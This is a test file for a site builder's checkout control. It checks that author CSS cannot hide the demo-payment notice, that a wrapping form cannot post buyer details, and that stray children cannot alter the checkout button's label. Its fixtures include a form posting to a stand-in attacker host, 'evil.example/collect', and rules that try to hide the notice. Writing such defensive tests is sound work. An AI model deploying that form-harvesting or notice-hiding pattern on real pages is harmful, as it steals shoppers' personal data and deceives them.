// The second round of checkout guards on a published page and in the Preview:
// rules on the control or an outer wrapper cannot hide the demo notice, a form
// the page wraps around the checkout posts nothing of the buyer's, and a stray
// child in the checkout button never reaches its words.
import React from 'react';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { render, cleanup, waitFor, act, fireEvent } from '@testing-library/react';
import ComponentModel from '@/models/ComponentModel';
import HeadlessComponentRenderer from '@/lib/renderer/HeadlessComponentRenderer';
import type { ComponentNode, CommerceServerRepository } from '@/lib/renderer/publish/hydrateBindings';
import type { CmsReadRepository } from '@/server/cms';
import { renderPublishedPage } from '@/lib/renderer/server/renderPublishedPage';
import { CART_STORAGE_KEY, CartProvider } from '@/lib/commerce/cart';
import { ShopLocaleContext } from '@/lib/commerce/shopRuntime';
import { buildShopParts, normalizeShopControl, shopPartRoleOf, type ShopTreeNode } from '@/lib/commerce/parts';

afterEach(() => {
  cleanup();
  window.localStorage.clear();
  vi.restoreAllMocks();
});

const repos = {
  cmsRepo: { listRows: async () => ({ rows: [], total: 0 }), getRow: async () => null } as unknown as CmsReadRepository,
  commerceRepo: {
    listProducts: async () => ({ products: [], total: 0 }),
    getProductByHandle: async () => null,
    listVariants: async () => [],
    getPrices: async () => [],
    getAvailability: async () => ({ variantId: 'x', locationId: 'all', availableQuantity: 0, limited: true, stale: false }),
  } as CommerceServerRepository,
};

function fakeResponse(status: number, body: unknown): Response {
  return { status, json: async () => body, text: async () => JSON.stringify(body) } as unknown as Response;
}

const control = (props: Record<string, unknown> = {}): ShopTreeNode => ({ id: 'co', type: 'div', props: { 'data-component-kind': 'checkout-button', ...props } });

/** Publish `root`, press checkout and wait for the payment step. */
async function toPayment(root: ComponentNode) {
  window.localStorage.setItem(CART_STORAGE_KEY, JSON.stringify([{ variantId: 'var_a', quantity: 1 }]));
  vi.spyOn(globalThis, 'fetch').mockResolvedValue(fakeResponse(201, { orderId: 'o1', orderNumber: 'ORD-1', totalCents: 4760, currency: 'EUR' }));
  const { body } = await renderPublishedPage({ root, pageParams: {}, ...repos, consent: { language: 'de' } });
  const view = render(<>{body}</>);
  const button = await waitFor(() => {
    const found = view.container.querySelector<HTMLButtonElement>('button[data-checkout]');
    expect(found?.disabled).toBe(false);
    return found!;
  });
  await act(async () => {
    fireEvent.click(button);
  });
  await waitFor(() => expect(view.container.querySelector('[data-checkout-payment]')).not.toBeNull());
  return view;
}

describe('rules that would hide the demo notice', () => {
  it('lose their hiding declarations on the control, and an outer wrapper rule with !important cannot win', async () => {
    const root: ComponentNode = {
      type: 'div',
      id: 'root',
      children: [
        {
          type: 'section',
          id: 'wrap',
          props: { rules: [{ id: 'w', selector: '& [data-checkout-demo-badge]', style: { display: 'none !important', visibility: 'hidden' } }] },
          children: [control({ rules: [{ id: 'h', selector: '&:hover [data-checkout-demo-badge]', style: { display: 'none' } }] }) as ComponentNode],
        },
      ],
    };
    const { container } = await toPayment(root);
    const sheet = [...container.querySelectorAll('style')].map((style) => style.textContent).join('\n');
    // The control's own rule reached inside: its display went.
    expect(sheet).not.toMatch(/fc_r-co[^{]*:hover \[data-checkout-demo-badge\]\{display:none/);
    // The platform's guard rule is on the page.
    expect(container.querySelector('style[data-shop-guard]')?.textContent).toContain('[data-shop-part="checkout.demo-badge"]{display:block!important');
    // The outer wrapper's rule stays, and loses to the inline pin.
    const badge = container.querySelector<HTMLElement>('[data-checkout-demo-badge]')!;
    expect(getComputedStyle(badge).display).toBe('block');
    expect(getComputedStyle(badge).visibility).toBe('visible');
  });
});

describe('a form the page wraps around the checkout', () => {
  it('has no buyer details to post', async () => {
    const root: ComponentNode = {
      type: 'div',
      id: 'root',
      children: [{ type: 'form', id: 'outer', props: { action: 'https://evil.example/collect', method: 'post' }, children: [control() as ComponentNode] }],
    };
    const { container } = await toPayment(root);
    const email = container.querySelector<HTMLInputElement>('input[data-checkout-buyer-field="email"]')!;
    act(() => {
      fireEvent.change(email, { target: { value: 'alex@example.com' } });
    });
    const form = email.closest('form');
    // Whatever form holds the inputs, none of them is a named control it would send.
    const sent = form ? [...new FormData(form).keys()] : [];
    expect(sent.filter((key) => ['name', 'email', 'addressLine1', 'postalCode', 'city', 'country'].includes(key))).toEqual([]);
    expect([...container.querySelectorAll('input[data-checkout-buyer-field]')].every((input) => !input.getAttribute('name'))).toBe(true);
  });
});

describe('a stray child in the checkout button', () => {
  it('never reaches its words in the Preview, where the tree is drawn as stored', async () => {
    const parts = buildShopParts('checkout-button', 'co', 'de').map((node) =>
      shopPartRoleOf(node.props) === 'checkout.button'
        ? { ...node, children: [...(node.children ?? []), { id: 'stray', type: 'span', componentType: 'host', props: { children: ' gratis' }, children: [] }] }
        : node,
    );
    window.localStorage.setItem(CART_STORAGE_KEY, JSON.stringify([{ variantId: 'var_a', quantity: 1 }]));
    const node = ComponentModel.create({ id: 'co', type: 'div', componentType: 'host', props: { 'data-component-kind': 'checkout-button' }, children: parts as never });
    const { container } = render(
      <ShopLocaleContext.Provider value="de">
        <CartProvider>
          <HeadlessComponentRenderer component={node} breakpointId="bp" allBreakpoints={[{ id: 'bp', minWidth: 0, label: 'BP' }]} />
        </CartProvider>
      </ShopLocaleContext.Provider>,
    );
    await waitFor(() => expect(container.querySelector('button[data-checkout]')?.textContent).toBe('Zur Kasse'));
    // And the normaliser drops it from the stored tree.
    const stored = normalizeShopControl({ ...control(), children: parts } as ShopTreeNode, 'de', 'node');
    const button = stored.children!.find((child) => shopPartRoleOf(child.props) === 'checkout.button')!;
    expect(button.children!.some((child) => child.id === 'stray')).toBe(false);
  });
});
